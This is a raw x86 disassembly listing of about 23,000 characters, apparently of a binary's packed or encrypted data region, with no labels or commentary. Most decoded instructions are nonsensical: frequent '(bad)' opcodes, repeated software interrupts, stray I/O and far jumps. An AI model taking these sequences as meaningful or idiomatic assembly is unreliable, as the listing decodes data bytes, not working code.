  425c1b:	mov    ebp,0x3bbd96cd
  425c20:	(bad)  
  425c22:	aad    0xd3
  425c24:	jmp    0x425bb8
  425c26:	shr    edx,cl
  425c28:	sub    BYTE PTR [ebx+0x13],dl
  425c2b:	or     al,BYTE PTR ds:0xd4cf
  425c31:	add    ch,cl
  425c33:	jbe    0x425c81
  425c35:	int    0x80
  425c37:	int    0x8d
  425c39:	std    
  425c3a:	int    0x96
  425c3c:	std    
  425c3d:	cmp    ecx,DWORD PTR [edi]
  425c3f:	shr    ebx,cl
  425c41:	xchg   edx,eax
  425c42:	int    0x6c
  425c44:	jo     0x425c81
  425c46:	aad    0xd3
  425c48:	jmp    0xcf05:0xa135328
  425c4f:	aam    0x0
  425c51:	add    BYTE PTR [eax],al
  425c53:	int    0x76
  425c55:	sbb    al,0xcd
  425c57:	lea    ebx,[ebx+edi*1]
  425c5a:	or     al,0xd3
  425c5c:	repnz sub BYTE PTR [ebx],bh
  425c5f:	jns    0x425c34
  425c61:	mov    ebp,0xcdd35392
  425c66:	(bad)  
  425c67:	std    
  425c68:	int    0x96
  425c6a:	std    
  425c6b:	cmp    edx,ebp
  425c6d:	cmp    ecx,DWORD PTR [edi]
  425c6f:	shr    edx,cl
  425c71:	sub    bl,dl
  425c73:	jmp    0x425c07
  425c75:	push   ebx
  425c76:	adc    ecx,ebp
  425c78:	xchg   esi,eax
  425c79:	std    
  425c7a:	int    0xa6
  425c7c:	std    
  425c7d:	cmp    ebx,DWORD PTR [ecx+0x492f3d3]
  425c83:	hlt    
  425c84:	call   ebx
  425c86:	in     eax,0x28
  425c88:	push   ebx
  425c89:	aad    0x87
  425c8b:	adc    ecx,DWORD PTR [edx]
  425c8d:	add    eax,0xd4cf
  425c92:	add    ch,cl
  425c94:	jbe    0x425c93
  425c96:	int    0x8d
  425c98:	std    
  425c99:	add    al,0x2
  425c9b:	call   ebx
  425c9d:	repnz sub BYTE PTR [ebx],bh
  425ca0:	jns    0x425c75
  425ca2:	mov    ebp,0xcdd35392
  425ca7:	(bad)  
  425ca8:	std    
  425ca9:	int    0x96
  425cab:	std    
  425cac:	add    al,0xfb
  425cae:	(bad)  
  425caf:	cmp    ecx,DWORD PTR [edi]
  425cb1:	shr    edx,cl
  425cb3:	sub    bl,dl
  425cb5:	jmp    0x425c49
  425cb7:	push   ebx
  425cb8:	adc    eax,DWORD PTR [edi-0x272322d]
  425cbe:	int    0x96
  425cc0:	std    
  425cc1:	add    al,0xfb
  425cc3:	(bad)  
  425cc4:	cmp    ecx,DWORD PTR [edi]
  425cc6:	shr    edx,cl
  425cc8:	sub    bl,dl
  425cca:	jmp    0x425c5e
  425ccc:	push   ebx
  425ccd:	adc    ecx,edi
  425ccf:	pop    ss
  425cd0:	nop
  425cd1:	add    BYTE PTR [eax],al
  425cd3:	add    BYTE PTR [edx-0x33],ah
  425cd6:	xchg   esi,eax
  425cd7:	std    
  425cd8:	int    0xa6
  425cda:	std    
  425cdb:	xchg   ebx,edx
  425cdd:	cmp    ebx,DWORD PTR [ecx+0xaa58dcf]
  425ce3:	int3   
  425ce4:	push   es
  425ce5:	aam    0x0
  425ce7:	add    BYTE PTR [eax],al
  425ce9:	int    0x76
  425ceb:	sub    al,0x4
  425ced:	hlt    
  425cee:	call   ebx
  425cf0:	repz xchg edx,eax
  425cf2:	shl    ebp,cl
  425cf4:	sub    BYTE PTR [ebx-0x2b],dl
  425cf7:	iret   
  425cf8:	or     edi,ebp
  425cfa:	add    BYTE PTR [eax+0x3d01cd80],0x81
  425d01:	add    BYTE PTR [eax+0x50007162],0x0
  425d08:	xchg   esi,eax
  425d09:	and    al,0x6
  425d0b:	ins    DWORD PTR es:[edi],dx
  425d0c:	aam    0xbc
  425d0e:	int    0x76
  425d10:	in     eax,dx
  425d11:	int    0x8d
  425d13:	adc    DWORD PTR [edi],ebp
  425d15:	inc    ebp
  425d16:	jge    0x425caa
  425d18:	shr    ebx,cl
  425d1a:	xchg   edx,eax
  425d1b:	int    0xe3
  425d1d:	int    0x7d
  425d1f:	int    0x76
  425d21:	in     eax,dx
  425d22:	int    0x96
  425d24:	adc    DWORD PTR [ebx],edi
  425d26:	fidivr DWORD PTR [ebx]
  425d28:	lock shr DWORD PTR [ebp+0x4c76cd28],cl
  425d2f:	push   ebx
  425d30:	adc    ecx,ebp
  425d32:	xor    BYTE PTR [ebx-0x76],al
  425d35:	jo     0x425d04
  425d37:	xchg   esi,eax
  425d38:	push   esp
  425d39:	in     al,dx
  425d3a:	push   esp
  425d3b:	int    0x92
  425d3d:	int    0xa6
  425d3f:	push   eax
  425d40:	retf   0x5324
  425d43:	or     DWORD PTR [eax+ecx*4],esp
  425d46:	int    0x76
  425d48:	cmc    
  425d49:	int    0x8d
  425d4b:	stc    
  425d4c:	das    
  425d4d:	inc    ebp
  425d4e:	jge    0x425ce2
  425d50:	shr    ebx,cl
  425d52:	xchg   edx,eax
  425d53:	int    0x8d
  425d55:	cmc    
  425d56:	int    0xa6
  425d58:	stc    
  425d59:	cmp    ecx,ecx
  425d5b:	cmp    ebx,ebp
  425d5d:	shl    edx,cl
  425d5f:	sub    ch,cl
  425d61:	lea    esi,[eax]
  425d63:	push   ebx
  425d64:	lds    eax,FWORD PTR [edi+0x4c76cd7d]
  425d6a:	int    0x1c
  425d6c:	inc    ebx
  425d6d:	(bad)  
  425d6e:	jo     0x425d7a
  425d70:	lea    esi,[eax]
  425d72:	or     cl,0xec
  425d75:	xchg   ch,cl
  425d77:	xchg   esi,eax
  425d78:	push   esp
  425d79:	int    0x76
  425d7b:	dec    esp
  425d7c:	int    0x4a
  425d7e:	int    0x20
  425d80:	xchg   DWORD PTR [esi-0x32e3f59c],ebx
  425d86:	sbb    al,0xcd
  425d88:	dec    edx
  425d89:	xchg   ebp,ecx
  425d8b:	sub    eax,0xa808080
  425d90:	lea    esi,[eax]
  425d92:	int    0x4a
  425d94:	int    0xa6
  425d96:	push   eax
  425d97:	xor    ecx,DWORD PTR [ecx*8+0x530a88a6]
  425d9e:	int    0x80
  425da0:	int    0x4a
  425da2:	xchg   DWORD PTR [esp+edi*1-0x33],edi
  425da6:	jbe    0x425d95
  425da8:	or     cl,BYTE PTR [ebp+0x118dcd0d]
  425dae:	das    
  425daf:	inc    ebp
  425db0:	jge    0x425d44
  425db2:	shr    ebx,cl
  425db4:	xchg   edx,eax
  425db5:	int    0x8d
  425db7:	in     eax,dx
  425db8:	int    0xa6
  425dba:	adc    DWORD PTR [ebx],edi
  425dbc:	leave  
  425dbd:	cmp    ebx,ebp
  425dbf:	shl    edx,cl
  425dc1:	sub    BYTE PTR [ebx-0x3b],dl
  425dc4:	or     dh,BYTE PTR [esi+0x44]
  425dc7:	int    0x76
  425dc9:	xor    bl,ch
  425dcb:	les    eax,FWORD PTR [ecx+0x76cd8080]
  425dd1:	in     eax,dx
  425dd2:	int    0x8d
  425dd4:	adc    DWORD PTR [edi],ebp
  425dd6:	inc    ebp
  425dd7:	jge    0x425d6b
  425dd9:	shr    ebx,cl
  425ddb:	xchg   edx,eax
  425ddc:	int    0x8d
  425dde:	in     eax,dx
  425ddf:	int    0xa6
  425de1:	adc    ebx,edx
  425de3:	repnz sub ch,cl
  425de6:	lea    edx,[ebx+edi*1]
  425de9:	leave  
  425dea:	cmp    ebx,ebp
  425dec:	add    al,0xd3
  425dee:	stc    
  425def:	push   ebx
  425df0:	(bad)
  425df3:	inc    ebx
  425df4:	shr    DWORD PTR [edi],cl
  425df6:	add    al,0xf7
  425df8:	add    BYTE PTR [eax+0x30a6cd80],0xcf
  425dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e00:	dec    ebx
  425e01:	mov    BYTE PTR [ebx],dh
  425e03:	jge    0x425e0f
  425e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e06:	xor    al,0xa
  425e08:	lea    edi,[ecx*8+0x76cdf18d]
  425e0f:	xchg   ebp,eax
  425e10:	das    
  425e11:	inc    ebp
  425e12:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e18:	jbe    0x425e0b
  425e1a:	int    0xa6
  425e1c:	xchg   ebp,eax
  425e1d:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e23:	cmp    esi,eax
  425e25:	cmp    ebx,ebp
  425e27:	push   ebx
  425e28:	or     al,0xcd
  425e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e2b:	stc    
  425e2c:	das    
  425e2d:	inc    ebp
  425e2e:	popf   
  425e2f:	xchg   edx,eax
  425e30:	or     dh,BYTE PTR [esi+0x54]
  425e33:	int    0x76
  425e35:	cmc    
  425e36:	push   ecx
  425e37:	out    0x54,al
  425e39:	add    al,0xd3
  425e3b:	dec    edx
  425e3c:	shr    esp,cl
  425e3e:	xchg   edx,eax
  425e3f:	int    0xa6
  425e41:	stc    
  425e42:	cmp    ebx,ebp
  425e44:	mov    DWORD PTR [esi+0x54b6d554],esp
  425e4a:	int    0xa6
  425e4c:	cmc    
  425e4d:	int    0x8d
  425e4f:	stc    
  425e50:	das    
  425e51:	inc    ebp
  425e52:	or     al,0x92
  425e54:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e5a:	shr    ebx,cl
  425e5c:	xchg   edx,eax
  425e5d:	int    0x8d
  425e5f:	stc    
  425e60:	cmp    ecx,ebx
  425e62:	shr    DWORD PTR [ebp+0x5476cd28],cl
  425e68:	cmp    esp,ecx
  425e6a:	push   ebx
  425e6b:	fcmovne st,st(5)
  425e6d:	lea    esi,[edi+ebp*1]
  425e70:	mov    ebx,0x2bc53389
  425e75:	ror    ebp,cl
  425e77:	(bad)  
  425e78:	icebp  
  425e79:	or     dh,BYTE PTR [esi+0x54]
  425e7c:	int    0x76
  425e7e:	xchg   ebp,eax
  425e7f:	das    
  425e80:	inc    ebp
  425e81:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e87:	jbe    0x425e7a
  425e89:	int    0xa6
  425e8b:	xchg   ebp,eax
  425e8c:	shr    DWORD PTR [ebp+0x3476cd28],cl
  425e92:	das    
  425e93:	mov    ebx,0xa6020180
  425e98:	cmp    ebx,ebp
  425e9a:	dec    edx
  425e9b:	or     al,0x1
  425e9d:	ror    DWORD PTR [edx-0x2b],cl
  425ea0:	mov    ebp,0xbdbfcb3b
  425ea5:	or     ah,BYTE PTR [ebx]
  425ea7:	and    eax,0x92d3352f
  425eac:	shr    DWORD PTR [ebp+0x37d65692],cl
  425eb2:	ficom  WORD PTR [ebx]
  425eb4:	cmp    ecx,DWORD PTR [esi+eiz*2]
  425eb7:	fidiv  WORD PTR [edi]
  425eb9:	ficom  WORD PTR [ebx]
  425ebb:	(bad)  
  425ebc:	ss inc ebx
  425ebe:	or     al,0xd6
  425ec0:	cs int 0x92
  425ec3:	int    0x8d
  425ec5:	xor    BYTE PTR [edi+0x548dcd81],al
  425ecb:	add    al,0x64
  425ecd:	mov    BYTE PTR [eax-0x6d32ce2c],al
  425ed3:	int    0x8d
  425ed5:	xor    BYTE PTR [edi-0x7772327f],al
  425edb:	xchg   DWORD PTR [esi+0x54],esi
  425ede:	int    0x89
  425ee0:	or     DWORD PTR [eax-0x6dcb89fc],0x2f3c8d00
  425eea:	push   es
  425eeb:	and    eax,DWORD PTR [eax]
  425eed:	add    BYTE PTR [eax],al
  425eef:	in     al,dx
  425ef0:	test   DWORD PTR [edi+0x25230abd],edi
  425ef6:	int    0x76
  425ef8:	adc    al,0x81
  425efa:	jbe    0x425f40
  425efc:	leave  
  425efd:	jbe    0x425f6c
  425eff:	scas   al,BYTE PTR es:[edi]
  425f00:	aaa    
  425f01:	ficom  WORD PTR [ebx]
  425f03:	or     ah,BYTE PTR [esi+0x6d76cd75]
  425f09:	int    0x8d
  425f0b:	jne    0x425f3c
  425f0d:	inc    ebp
  425f0e:	jge    0x425ea2
  425f10:	shr    ebx,cl
  425f12:	xchg   edx,eax
  425f13:	int    0x8d
  425f15:	ins    DWORD PTR es:[edi],dx
  425f16:	int    0xa6
  425f18:	jne    0x425eed
  425f1a:	repnz sub ch,cl
  425f1d:	lea    ecx,[ebp+ecx*8-0x77]
  425f21:	cmp    ecx,ecx
  425f23:	cmp    ebx,ebp
  425f25:	push   ebx
  425f26:	(bad)
  425f29:	shl    esp,cl
  425f2b:	int    0x8d
  425f2d:	inc    esp
  425f2e:	inc    ebx
  425f2f:	mov    BYTE PTR [edi+0x54],dh
  425f32:	int    0x76
  425f34:	xor    BYTE PTR [edi+0x760a1476],al
  425f3a:	xor    ch,cl
  425f3c:	ins    BYTE PTR es:[edi],dx
  425f3d:	test   BYTE PTR [edx],cl
  425f3f:	jbe    0x425f55
  425f41:	int    0x76
  425f43:	in     eax,dx
  425f44:	int    0x8d
  425f46:	adc    DWORD PTR [edi],ebp
  425f48:	inc    ebp
  425f49:	jge    0x425edd
  425f4b:	shr    ebx,cl
  425f4d:	xchg   edx,eax
  425f4e:	int    0x8d
  425f50:	in     eax,dx
  425f51:	int    0xa6
  425f53:	adc    DWORD PTR [ebx],edi
  425f55:	fnstsw WORD PTR [ebx]
  425f57:	leave  
  425f58:	push   ebx
  425f59:	(bad)
  425f5c:	sub    BYTE PTR [esi+0x76],bl
  425f5f:	adc    al,0x2f
  425f61:	push   es
  425f62:	mov    esi,0xcd0000ff
  425f67:	(bad)  
  425f68:	std    
  425f69:	int    0x96
  425f6b:	std    
  425f6c:	cmp    ecx,DWORD PTR [edi]
  425f6e:	shr    ebx,cl
  425f70:	xchg   edx,eax
  425f71:	sar    bh,0x9c
  425f74:	cmp    esi,ecx
  425f76:	shr    edx,cl
  425f78:	sub    BYTE PTR [ebx+0x13],dl
  425f7b:	int    0x96
  425f7d:	std    
  425f7e:	int    0xa6
  425f80:	std    
  425f81:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f87:	popf   
  425f88:	shl    ebp,cl
  425f8a:	sub    BYTE PTR [ebx-0x2b],dl
  425f8d:	xchg   DWORD PTR [ebx],edx
  425f8f:	int    0x96
  425f91:	std    
  425f92:	int    0xa6
  425f94:	std    
  425f95:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f9b:	popf   
  425f9c:	shl    ebp,cl
  425f9e:	sub    BYTE PTR [ebx-0x2b],dl
  425fa1:	xchg   DWORD PTR [ebx],edx
  425fa3:	int    0x96
  425fa5:	std    
  425fa6:	int    0xa6
  425fa8:	std    
  425fa9:	cmp    ebx,DWORD PTR [ecx-0xc2c62c5]
  425faf:	xchg   edx,eax
  425fb0:	shl    ebp,cl
  425fb2:	sub    BYTE PTR [ebx-0x2b],dl
  425fb5:	xchg   DWORD PTR [ebx],edx
  425fb7:	or     cl,bh
  425fb9:	nop
  425fba:	add    BYTE PTR [eax],al
  425fbc:	add    ch,cl
  425fbe:	lea    edx,[eax-0x33]
  425fc1:	xchg   esi,eax
  425fc2:	mov    ebp,0x3bbda6cd
  425fc7:	cdq    
  425fc8:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425fce:	in     eax,0x28
  425fd0:	push   ebx
  425fd1:	aad    0xa
  425fd3:	int3   
  425fd4:	pop    ss
  425fd5:	aam    0x0
  425fd7:	add    BYTE PTR [eax],al
  425fd9:	int    0x8d
  425fdb:	dec    esp
  425fdc:	int    0x89
  425fde:	int    0x96
  425fe0:	std    
  425fe1:	int    0xa6
  425fe3:	std    
  425fe4:	int    0x7e
  425fe6:	jo     0x426023
  425fe8:	cdq    
  425fe9:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425fef:	in     eax,0x28
  425ff1:	push   ebx
  425ff2:	aad    0xa
  425ff4:	int3   
  425ff5:	pop    ss
  425ff6:	aam    0x0
  425ff8:	add    BYTE PTR [eax],al
  425ffa:	int    0x8d
  425ffc:	sbb    al,0xcd
  425ffe:	xchg   esi,eax
  425fff:	sbb    al,0x3b
  426001:	icebp  
  426002:	shr    edx,cl
  426004:	sub    BYTE PTR [ebx],bh
  426006:	psrlq  mm5,mm3
  426009:	xchg   edx,eax
  42600a:	push   ebx
  42600b:	adc    ecx,ebp
  42600d:	xchg   esi,eax
  42600e:	std    
  42600f:	int    0xa6
  426011:	std    
  426012:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  426018:	cdq    
  426019:	shl    ebp,cl
  42601b:	sub    bl,dl
  42601d:	repz xchg edx,eax
  42601f:	push   ebx
  426020:	aad    0xcd
  426022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426023:	std    
  426024:	cmp    edi,DWORD PTR [ecx+0x4]
  426027:	hlt    
  426028:	call   ebx
  42602a:	mov    ebp,0x28e5d392
  42602f:	push   ebx
  426030:	lds    eax,FWORD PTR [edi+0x17cc0af1]
  426036:	aam    0x0
  426038:	add    BYTE PTR [eax],al
  42603a:	int    0x8d
  42603c:	std    
  42603d:	int    0x96
  42603f:	std    
  426040:	cmp    ecx,DWORD PTR [edi]
  426042:	shr    ebx,cl
  426044:	xchg   edx,eax
  426045:	sar    bh,0x9c
  426048:	cmp    esi,ecx
  42604a:	shr    edx,cl
  42604c:	sub    BYTE PTR [ebx+0x13],dl
  42604f:	int    0x96
  426051:	std    
  426052:	int    0xa6
  426054:	std    
  426055:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42605b:	popf   
  42605c:	shl    ebp,cl
  42605e:	sub    BYTE PTR [ebx-0x2b],dl
  426061:	xchg   DWORD PTR [ebx],edx
  426063:	int    0x96
  426065:	std    
  426066:	int    0xa6
  426068:	std    
  426069:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42606f:	popf   
  426070:	shl    ebp,cl
  426072:	sub    BYTE PTR [ebx-0x2b],dl
  426075:	xchg   DWORD PTR [ebx],edx
  426077:	iret   
  426078:	xchg   esi,eax
  426079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42607a:	or     dl,BYTE PTR ds:0xd4cf
  426080:	add    bh,cl
  426082:	iret   
  426083:	nop
  426084:	add    BYTE PTR [eax],al
  426086:	add    BYTE PTR [ecx-0x33],dh
  426089:	(bad)  
  42608a:	std    
  42608b:	int    0x96
  42608d:	std    
  42608e:	cmp    ecx,DWORD PTR [edi]
  426090:	int    0xd6
  426092:	sub    al,0x3b
  426094:	icebp  
  426095:	shr    ebx,cl
  426097:	xchg   edx,eax
  426098:	shr    edx,cl
  42609a:	sub    BYTE PTR [ebx+0x13],dl
  42609d:	jno    0x42606e
  42609f:	pop    es
  4260a0:	out    dx,eax
  4260a1:	add    BYTE PTR [eax+0x7cd7080],0x3d
  4260a8:	add    DWORD PTR [eax+0x500080],0x7cd2496
  4260b2:	add    DWORD PTR [ecx+0x760a8080],eax
  4260b8:	dec    esp
  4260b9:	int    0x76
  4260bb:	mov    ch,cl
  4260bd:	mov    BYTE PTR [edi-0x72f5b373],al
  4260c3:	dec    esp
  4260c4:	int    0x8d
  4260c6:	cmc    
  4260c7:	int    0x96
  4260c9:	stc    
  4260ca:	das    
  4260cb:	inc    ebp
  4260cc:	jecxz  0x426060
  4260ce:	shl    ebx,cl
  4260d0:	xchg   edx,eax
  4260d1:	int    0x96
  4260d3:	cmc    
  4260d4:	int    0xd6
  4260d6:	stc    
  4260d7:	cmp    esi,edi
  4260d9:	shr    edx,cl
  4260db:	sub    ch,cl
  4260dd:	xchg   esi,eax
  4260de:	cmc    
  4260df:	cmp    esi,eax
  4260e1:	push   ebx
  4260e2:	bswap  ebp
  4260e4:	(bad)  
  4260e5:	stc    
  4260e6:	das    
  4260e7:	inc    ebp
  4260e8:	sti    
  4260e9:	xchg   edx,eax
  4260ea:	shr    edi,cl
  4260ec:	xchg   edx,eax
  4260ed:	int    0xd6
  4260ef:	cmc    
  4260f0:	int    0xa6
  4260f2:	stc    
  4260f3:	cmp    ebx,ecx
  4260f5:	cmp    ebx,ebp
  4260f7:	push   ebx
  4260f8:	aad    0x87
  4260fa:	adc    ecx,ebp
  4260fc:	xchg   esi,eax
  4260fd:	cmc    
  4260fe:	sar    DWORD PTR [ecx-0x62932d8],cl
  426104:	das    
  426105:	inc    ebp
  426106:	sti    
  426107:	xchg   edx,eax
  426108:	shr    edi,cl
  42610a:	xchg   edx,eax
  42610b:	int    0xd6
  42610d:	cmc    
  42610e:	int    0xa6
  426110:	stc    
  426111:	cmp    ebx,ecx
  426113:	cmp    ebx,ebp
  426115:	push   ebx
  426116:	aad    0x87
  426118:	adc    ecx,ebp
  42611a:	xchg   esi,eax
  42611b:	cmc    
  42611c:	sar    DWORD PTR [ecx-0x62932d8],cl
  426122:	das    
  426123:	inc    ebp
  426124:	sti    
  426125:	xchg   edx,eax
  426126:	shr    edi,cl
  426128:	xchg   edx,eax
  426129:	int    0xd6
  42612b:	cmc    
  42612c:	cmp    ebx,ecx
  42612e:	int    0xe6
  426130:	stc    
  426131:	cmp    eax,DWORD PTR [eax]
  426133:	push   ebx
  426134:	fld    DWORD PTR [edi+0x707113]
  42613a:	(bad)  
  42613b:	dec    esp
  42613c:	sar    DWORD PTR [ecx-0x12c242d8],cl
  426142:	add    BYTE PTR [eax],al
  426144:	int    0x76
  426146:	or     eax,0xcb63a8aa
  42614b:	rcl    BYTE PTR [eax-0x80],cl
  42614e:	xchg   esi,eax
  42614f:	int    0xed
  426151:	add    al,0xed
  426153:	inc    esp
  426154:	pop    ebx
  426155:	cwde   
  426156:	call   0x76c9:0xcb3bdd3b
  42615d:	popf   
  42615e:	(bad)  
  42615f:	aaa    
  426160:	ficom  WORD PTR [ebx]
  426162:	pop    ebp
  426163:	mov    ebp,0xa25230a
  426168:	jbe    0x42610f
  42616a:	leave  
  42616b:	jbe    0x42612a
  42616d:	xchg   ecx,eax
  42616e:	aaa    
  42616f:	ficom  WORD PTR [ebx]
  426171:	or     dh,BYTE PTR [esi-0x13]
  426174:	leave  
  426175:	jbe    0x426164
  426177:	dec    ecx
  426178:	mov    al,ds:0x76c93586
  42617d:	cmc    
  42617e:	dec    ecx
  42617f:	lahf   
  426180:	xchg   BYTE PTR ds:0x691176c9,dh
  426186:	and    DWORD PTR [esi+0x1176c935],eax
  42618c:	cmp    DWORD PTR [ecx],esp
  42618e:	xchg   BYTE PTR ds:0x49f976c9,dh
  426194:	and    DWORD PTR [ebp+esi*1+0xa8476cf],eax
  42619b:	jbe    0x426196
  42619d:	int    0x76
  42619f:	sbb    al,0xcd
  4261a1:	shl    BYTE PTR ds:0xcd808081,1
  4261a7:	jbe    0x4261c5
  4261a9:	int    0x8d
  4261ab:	sbb    al,0xcd
  4261ad:	add    DWORD PTR ds:0xcd808081,ebp
  4261b3:	xor    ch,cl
  4261b5:	pop    esp
  4261b6:	xchg   eax,esp
  4261b8:	fs int 0x96
  4261bb:	popf   
  4261bc:	int    0xa
  4261be:	and    eax,0xa808081
  4261c3:	out    0xb5,al
  4261c5:	int    0xe6
  4261c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261c8:	das    
  4261c9:	inc    ebp
  4261ca:	add    edx,DWORD PTR [edx-0x326def2d]
  4261d0:	out    0x9d,al
  4261d2:	int    0xa6
  4261d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261d5:	adc    bh,bl
  4261d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261d8:	mov    esi,0xdd3b4229
  4261dd:	shr    ecx,cl
  4261df:	sub    ch,cl
  4261e1:	pop    esi
  4261e2:	push   ebx
  4261e3:	aad    0x43
  4261e5:	(bad)  
  4261e7:	nop
  4261e8:	int    0x18
  4261ea:	or     dl,BYTE PTR [esi+0x1496cdf9]
  4261f0:	int    0x96
  4261f2:	xor    ch,cl
  4261f4:	xchg   esi,eax
  4261f5:	dec    esp
  4261f6:	iret   
  4261f7:	xchg   esi,eax
  4261f8:	lods   eax,DWORD PTR ds:[esi]
  4261f9:	bound  eax,QWORD PTR [eax]
  4261fb:	(bad)  
  4261fc:	stc    
  4261fd:	jno    0x42626f
  4261ff:	cwde   
  426200:	add    dh,dl
  426202:	sbb    al,0xcf
  426204:	jbe    0x4261bb
  426206:	add    dh,dl
  426208:	mov    BYTE PTR [eax],al
  42620a:	(bad)  
  42620b:	cmc    
  42620c:	add    dh,dl
  42620e:	adc    DWORD PTR [eax],eax
  426210:	(bad)  
  426211:	in     eax,dx
  426212:	jo     0x4261e3
  426214:	jbe    0x426213
  426216:	jo     0x4261d5
  426218:	stos   BYTE PTR es:[edi],al
  426219:	clc    
  42621a:	add    BYTE PTR [eax],al
  42621c:	or     dh,BYTE PTR [esi+0x1c]
  42621f:	int    0x76
  426221:	sbb    al,0xcd
  426223:	lea    esp,[edx+ecx*1]
  426226:	outs   dx,BYTE PTR ds:[esi]
  426227:	adc    al,0xcd
  426229:	jbe    0x42624f
  42622b:	leave  
  42622c:	add    BYTE PTR [edi-0x327f7f80],0x76
  426233:	lods   eax,DWORD PTR ds:[esi]
  426234:	int    0x8d
  426236:	and    al,0xa
  426238:	outs   dx,BYTE PTR ds:[esi]
  426239:	test   ch,cl
  42623b:	jbe    0x42626d
  42623d:	int    0x8d
  42623f:	and    al,0xa
  426241:	outs   dx,BYTE PTR ds:[esi]
  426242:	mov    ch,cl
  426244:	jbe    0x42625a
  426246:	int    0x8d
  426248:	and    al,0xa
  42624a:	outs   dx,BYTE PTR ds:[esi]
  42624b:	dec    esp
  42624c:	int    0x76
  42624e:	and    al,0xc9
  426250:	ins    BYTE PTR es:[edi],dx
  426251:	and    al,0x81
  426253:	add    BYTE PTR [eax-0x32e11380],0x76
  42625a:	sbb    al,0xcd
  42625c:	lea    ebx,[ecx*8-0x7f7ed2ff]
  426263:	or     ch,0xa
  426266:	and    eax,0xcd808081
  42626b:	xor    BYTE PTR [ebx],0x81
  42626e:	or     dh,BYTE PTR [esi-0x3]
  426271:	int    0x76
  426273:	std    
  426274:	stos   BYTE PTR es:[edi],al
  426275:	test   al,0x63
  426277:	retf   
  426278:	rcr    BYTE PTR [eax+eax*4],cl
  42627b:	xchg   esi,eax
  42627c:	int    0xed
  42627e:	int    0x76
  426280:	dec    esp
  426281:	adc    ch,ch
  426283:	cmp    eax,0x5b808081
  426288:	cwde   
  426289:	call   0x2f35:0x86214966
  426290:	push   es
  426291:	mov    ecx,0xcd80804a
  426296:	jbe    0x4262c8
  426298:	inc    cx
  42629a:	and    DWORD PTR [esi-0x62f9d0cb],eax
  4262a0:	dec    edx
  4262a1:	add    BYTE PTR [eax-0x29128937],0x37
  4262a8:	ficom  WORD PTR [ebx]
  4262aa:	pop    ebp
  4262ab:	mov    ebp,0xa25230a
  4262b0:	jbe    0x4262c3
  4262b2:	leave  
  4262b3:	jbe    0x42626a
  4262b5:	xchg   ecx,eax
  4262b6:	aaa    
  4262b7:	ficom  WORD PTR [ebx]
  4262b9:	or     dh,BYTE PTR [esi-0x43]
  4262bc:	int    0x76
  4262be:	mov    BYTE PTR [edx],cl
  4262c0:	jbe    0x4262b7
  4262c2:	int    0x76
  4262c4:	cmc    
  4262c5:	int    0x1
  4262c7:	mov    ebp,0xcd808081
  4262cc:	or     ch,0x80
  4262cf:	or     dh,BYTE PTR [esi-0x7]
  4262d2:	pop    edi
  4262d3:	jle    0x42630a
  4262d5:	add    BYTE PTR [eax-0x7fca69a3],0x80
  4262dc:	mov    eax,0x4b0760a
  4262e1:	ins    DWORD PTR es:[edi],dx
  4262e2:	(bad)  
  4262e3:	mov    eax,0xcda2760a
  4262e8:	sar    DWORD PTR [eax+0x5d15760a],cl
  4262ee:	(bad)  
  4262ef:	xor    eax,0xf1cd8080
  4262f4:	mov    eax,0xcf19960a
  4262f9:	nop
  4262fa:	xchg   edx,eax
  4262fb:	iret   
  4262fc:	sahf   
  4262fd:	(bad)  
  4262fe:	int    0x99
  426300:	mov    eax,0xcd1d960a
  426305:	aad    0xb8
  426307:	or     dl,BYTE PTR [esi-0x662dfbdf]
  42630d:	mov    eax,0xcf01960a
  426312:	jno    0x426368
  426314:	int    0x3
  426316:	mov    eax,0x40be60a
  42631b:	leave  
  42631c:	xchg   ebp,eax
  42631d:	mov    eax,0xcf05e60a
  426322:	ficomp WORD PTR [eax-0x48]
  426325:	or     ah,dh
  426327:	pop    es
  426328:	mov    eax,0xb809760a
  42632d:	or     dl,dh
  42632f:	retf   0xc5cd
  426332:	mov    eax,0xb8cc760a
  426337:	or     dl,BYTE PTR [edi]
  426339:	ins    BYTE PTR es:[edi],dx
  42633a:	add    BYTE PTR [eax],al
  42633c:	add    BYTE PTR [ebp*2+0x60ab8d0],al
  426343:	push   edx
  426344:	add    BYTE PTR [eax],al
  426346:	add    bh,cl
  426348:	outs   dx,BYTE PTR ds:[esi]
  426349:	add    edi,DWORD PTR [eax+0x74060a]
  42634f:	add    BYTE PTR [eax],al
  426351:	add    al,0x6d
  426353:	inc    edx
  426354:	mov    eax,0x78060a
  426359:	add    BYTE PTR [eax],al
  42635b:	iret   
  42635c:	outs   dx,BYTE PTR ds:[esi]
  42635d:	xor    BYTE PTR [eax+0x7c060a],bh
  426363:	add    BYTE PTR [eax],al
  426365:	add    al,0x6d
  426367:	xor    bh,BYTE PTR [eax+0x8a060a]
  42636d:	add    BYTE PTR [eax],al
  42636f:	mov    eax,0x8ccf0a
  426374:	add    BYTE PTR [eax],al
  426376:	int    0xc5
  426378:	mov    eax,0x8e060a
  42637d:	add    BYTE PTR [eax],al
  42637f:	int    0x76
  426381:	in     eax,dx
  426382:	int    0x8d
  426384:	adc    DWORD PTR [edi],ebp
  426386:	inc    ebp
  426387:	jge    0x42631b
  426389:	shr    ebx,cl
  42638b:	xchg   edx,eax
  42638c:	int    0x8d
  42638e:	in     eax,dx
  42638f:	int    0x96
  426391:	adc    ebx,eax
  426393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
